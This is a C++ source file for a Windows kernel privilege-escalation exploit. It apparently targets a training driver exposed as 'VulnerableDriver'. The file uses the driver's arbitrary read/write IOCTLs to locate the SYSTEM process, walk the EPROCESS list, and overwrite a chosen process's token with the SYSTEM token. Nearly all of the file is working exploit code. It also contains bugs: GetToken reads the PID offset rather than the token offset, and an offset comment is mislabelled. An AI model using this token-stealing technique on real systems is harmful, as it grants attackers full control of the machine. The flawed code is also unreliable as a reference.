#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <iostream>
#include <sstream>

#define IOCTL_READ_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define EPROCESS structure offsets
#define EPROCESS_PID_OFFSET   0x440     // PID offset in EPROCESS
#define EPROCESS_ACTIVEPROCESSLINKS_OFFSET   0x448     // PID offset in EPROCESS
#define EPROCESS_TOKEN_OFFSET 0x4b8     // Token offset in EPROCESS

HANDLE hDevice;

uint64_t addressSystemEprocess;
ULONG_PTR PsInitialSystemProcess; // that global symbol in kernel

HANDLE openDevice(PCWSTR symLink) {
    return CreateFile(
        symLink,   // The symbolic link to the device
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
}

UCHAR readBYTE(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint8_t buffer[9]; // buffer[0-7] = address, buffer[8] = value

    memcpy(buffer, &address, sizeof(PVOID));

    bool success;
    DWORD bytesReturned;
    success = DeviceIoControl(
        hDevice,
        IOCTL_READ_BYTE,
        &buffer,
        sizeof(buffer),
        &buffer,
        sizeof(buffer),
        &bytesReturned,
        NULL);

    if (!success) {
        std::cerr << "Read failed. Error: " << GetLastError() << std::endl;
        return -1;
    }

    return buffer[8];
}

WORD readWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    WORD result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    result |= readBYTE(ptr);
    result |= (readBYTE(ptr + 1) << 8);

    return result;
}

DWORD readDWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    DWORD result = 0;

    // Cast the base address to BYTE* for proper byte-wise pointer arithmetic
    BYTE* ptr = static_cast<BYTE*>(address);

    // Read each byte and shift them into the DWORD result
    result |= readBYTE(ptr);               // Read byte 0
    result |= (readBYTE(ptr + 1) << 8);    // Read byte 1
    result |= (readBYTE(ptr + 2) << 16);   // Read byte 2
    result |= (readBYTE(ptr + 3) << 24);   // Read byte 3

    return result;
}

uint64_t readQWORD(PVOID address)
{
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Invalid handle to device. Error: " << GetLastError() << std::endl;
        return -1;
    }

    uint64_t result = 0;

    BYTE* ptr = static_cast<BYTE*>(address);
    DWORD lowPart = readDWORD(ptr);
    DWORD highPart = readDWORD(ptr + 4);

    result = (static_cast<uint64_t>(highPart) << 32) | static_cast<uint64_t>(lowPart);

    return result;
}


DWORD writeBYTE (PVOID address, UCHAR c) {// Example: Write a byte to the kernel memory address
    uint8_t buffer[9]; // buffer[0-7] = address, buffer[8] = value
    memcpy(buffer, &address, sizeof(PVOID));
    buffer[8] = c;                          // Value to write

    bool success;
    DWORD bytesReturned;
    success = DeviceIoControl(
        hDevice,
        IOCTL_WRITE_BYTE,
        &buffer,
        sizeof(buffer),
        NULL,
        0,
        &bytesReturned,
        NULL);

    if (success) {
        std::cout << "Write successful" << std::endl;
    }
    else {
        std::cerr << "Write failed. Error: " << GetLastError() << std::endl;
    }
    return bytesReturned;
}

DWORD writeWORD(PVOID address, WORD value) {
    BYTE* ptr = static_cast<BYTE*>(address);

    // Write the two bytes of the WORD value
    writeBYTE(ptr, value & 0xFF);           // Write low byte
    writeBYTE(ptr + 1, (value >> 8) & 0xFF); // Write high byte

    std::cout << "Write WORD successful" << std::endl;
    return 0; // Return value can be changed to indicate success/failure
}

DWORD writeDWORD(PVOID address, DWORD value) {
    WORD lowWord = value & 0xFFFF;           // Extract the lower 2 bytes (WORD)
    WORD highWord = (value >> 16) & 0xFFFF;  // Extract the upper 2 bytes (WORD)

    BYTE* ptr = static_cast<BYTE*>(address);

    // Write the low and high WORD values using writeWORD
    writeWORD(ptr, lowWord);             // Write the low WORD (first 2 bytes)
    writeWORD(ptr + 2, highWord);        // Write the high WORD (next 2 bytes)

    std::cout << "Write DWORD successful" << std::endl;
    return 0; // Return value can be changed to indicate success/failure
}

DWORD writeQWORD(PVOID address, uint64_t value) {
    DWORD lowDWORD = value & 0xFFFFFFFF;           // Extract the lower 4 bytes (DWORD)
    DWORD highDWORD = (value >> 32) & 0xFFFFFFFF;  // Extract the upper 4 bytes (DWORD)

    BYTE* ptr = static_cast<BYTE*>(address);

    // Write the low and high DWORD values using writeDWORD
    writeDWORD(ptr, lowDWORD);              // Write the low DWORD (first 4 bytes)
    writeDWORD(ptr + 4, highDWORD);         // Write the high DWORD (next 4 bytes)

    std::cout << "Write QWORD successful" << std::endl;
    return 0; // Return value can be changed to indicate success/failure
}

// +
ULONG_PTR GetAddressKernelBase() // from userspace
{
    ULONG_PTR pKernelBaseAddress = 0;
    LPVOID* lpImageBase = NULL;
    DWORD dwBytesNeeded = 0;

    // first call calculates the exact size needed to read all the data
    if (!EnumDeviceDrivers(NULL, 0, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        return pKernelBaseAddress;
    }

    // allocate enough memory to read all data from EnumDeviceDrivers
    if (!(lpImageBase = (LPVOID*)HeapAlloc(GetProcessHeap(), 0, dwBytesNeeded))) {
        printf("[-] Couldn't allocate heap for lpImageBase.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    if (!EnumDeviceDrivers(lpImageBase, dwBytesNeeded, &dwBytesNeeded)) {
        printf("[-] Couldn't EnumDeviceDrivers.\n");
        if (lpImageBase)
            HeapFree(GetProcessHeap(), 0, lpImageBase);

        return pKernelBaseAddress;
    }

    // the first entry in the list is the kernel
    pKernelBaseAddress = ((ULONG_PTR*)lpImageBase)[0];
    printf("[*] KernelBaseAddress: %llx\n", pKernelBaseAddress);

    return pKernelBaseAddress;
}

// +
DWORD GetOffsetSystemProcess() // from userspace
{
    HMODULE ntoskrnl = NULL;
    DWORD dwPsInitialSystemProcessOffset = 0;
    ULONG_PTR pPsInitialSystemProcess = 0;

    // value of ntoskrnl is the base address of the mapped ntoskrnl.exe in our process memory
    ntoskrnl = LoadLibraryA("ntoskrnl.exe");
    if (ntoskrnl == NULL) {
        printf("[-] Couldn't load ntoskrnl.exe\n");
        return 0;
    }

    pPsInitialSystemProcess = (ULONG_PTR)GetProcAddress(ntoskrnl, "PsInitialSystemProcess");
    if (pPsInitialSystemProcess) {
        // substracting from the address of the symbol the base address gives us the offset
        dwPsInitialSystemProcessOffset = (DWORD)(pPsInitialSystemProcess - (ULONG_PTR)(ntoskrnl));
        FreeLibrary(ntoskrnl);
        return dwPsInitialSystemProcessOffset;
    }

    printf("[-] Couldn't GetProcAddress of PsInitialSystemProcess\n");
    return 0;
}

// +
ULONG_PTR GetKernelAddressSystem(ULONG_PTR KernelBase, DWORD Offset) // from userspace
{
    return KernelBase + Offset;
}

// +
ULONG_PTR GetToken(ULONG_PTR addressEPROCESS)
{
    if (addressEPROCESS == 0) {
        printf("");
        std::cout << "[-] Pointer to EPROCESS " << std::hex << addressEPROCESS << " is not initialized!" << std::endl;
    }

    PVOID addressToken = reinterpret_cast<PVOID>(addressEPROCESS + EPROCESS_PID_OFFSET);
    ULONG_PTR Token = readQWORD(addressToken);
    return Token;
}

// +
DWORD GetPID(ULONG_PTR addressEPROCESS) {
    if (addressEPROCESS == 0) {
        printf("");
        std::cout << "[-] Pointer to EPROCESS " << std::hex << addressEPROCESS << " is not initialized!" << std::endl;
    }

    PVOID addressPID = reinterpret_cast<PVOID>(addressEPROCESS + EPROCESS_PID_OFFSET);
    DWORD PID = readDWORD(addressPID);

    return PID;
}

ULONG_PTR GetEprocessByPID(DWORD Pid) {
    DWORD currentPID = 0;
    ULONG_PTR currentEprocess = 0;
    ULONG_PTR flink = 0;

    // start traversing from the System process
    currentEprocess = addressSystemEprocess;
    currentPID = GetPID(currentEprocess);

    while (currentPID != Pid) {
        // read the address for the next EPROCESS in the list

        PVOID addressNextEprocess = reinterpret_cast<PVOID>(currentEprocess + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
        uint64_t flink = readQWORD(addressNextEprocess);

        // the address points to the Flink field, so we need to substract the offset of ActiveProcessLinks to get the base address of the EPROCESS structure
        currentEprocess = flink - EPROCESS_ACTIVEPROCESSLINKS_OFFSET;
        currentPID = GetPID(currentEprocess);
    }

    return currentEprocess;
}

BOOL GetSystem(DWORD Pid) {
    ULONG_PTR systemToken;
    ULONG_PTR targetEprocess;
    ULONG_PTR targetToken;
    ULONGLONG targetTokenReferenceCount;
    ULONG_PTR newToken;
    DWORD targetPid = 0;


    if (Pid == 0) {
        targetPid = GetCurrentProcessId();
    } else {
        targetPid = Pid;
    }

    systemToken = GetToken(addressSystemEprocess);
    // Token = EPROCESS || Reference count
    // Least significat 4 bits - reference count
    // Zeroing-out those bits will get us the actual pointer to the Token
    systemToken = systemToken & ~15;

    targetEprocess = GetEprocessByPID(targetPid);
    targetToken = GetToken(targetEprocess);

    // Get the target process Token reference count
    targetTokenReferenceCount = targetToken & 15;

    // Combine the system token pointer with the reference count of the target process
    newToken = systemToken | targetTokenReferenceCount;

    // Overwrite the target process Token value
    PVOID addressTokenTarget = reinterpret_cast<PVOID>(targetEprocess + EPROCESS_TOKEN_OFFSET);
    writeQWORD(addressTokenTarget, newToken);
    std::cout << "[+] ---------elevated" << std::endl;
    return 0;
}

int main(int argc, char** argv)
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <kernel_address>" << std::endl;
        return 1;
    }

    scanf_s("%*c");

    // Parse the memory address from argv[1]
    std::stringstream ss;
    ss << std::hex << argv[1];
    PVOID address = nullptr;
    ss >> address;

    if (address == nullptr) {
        std::cerr << "Invalid address provided." << std::endl;
        return 1;
    }

    hDevice = openDevice(L"\\\\.\\VulnerableDriver");
    std::cout << "Read BYTE successful, value: 0x" << std::hex << static_cast<int>(readBYTE(address)) << std::endl;
    std::cout << "Read DWORD successful, value: 0x" << std::hex << static_cast<int>(readDWORD(address)) << std::endl;
    std::cout << "Read QWORD successful, value: 0x" << std::hex << static_cast<uint64_t>(readQWORD(address)) << std::endl;

    ///////////////////////////////////// Get EPROCESS address of system

    ULONG_PTR addressKernelBase = GetAddressKernelBase();
    if (!addressKernelBase) return -1;

    DWORD offsetSystemProcess = GetOffsetSystemProcess();
    if (!offsetSystemProcess) return -1;

    PsInitialSystemProcess = GetKernelAddressSystem(addressKernelBase, offsetSystemProcess);
    addressSystemEprocess = readQWORD(reinterpret_cast<PVOID>(PsInitialSystemProcess));
    std::cout << "EPROCESS address of System is: 0x" << std::hex << addressSystemEprocess << std::endl;

    //////////////////////////////////// Get token of System
    PVOID addressTokenSystem = reinterpret_cast<PVOID>(addressSystemEprocess + EPROCESS_TOKEN_OFFSET);
    ULONG_PTR valueTokenSystem = (ULONG_PTR)readQWORD(addressTokenSystem);
    std::cout << "Token field value is: 0x" << std::hex << valueTokenSystem << std::endl;

    //////////////////////////////////// Get ActiveProcessLinks linked list

    PVOID addressActiveProcessList = reinterpret_cast<PVOID>(addressSystemEprocess + EPROCESS_ACTIVEPROCESSLINKS_OFFSET);
    ULONG_PTR ActiveProcessLinks = readQWORD(addressActiveProcessList);
    std::cout << "ActiveProcessLinks field value is: 0x" << std::hex << ActiveProcessLinks << std::endl;

    ULONG_PTR eprocess = GetEprocessByPID(10572);
    std::cout << "cmd eprocess value is: 0x" << std::hex << eprocess << std::endl;

    GetSystem(10572);

    scanf_s("%*c");

    CloseHandle(hDevice);
    return 0;
}
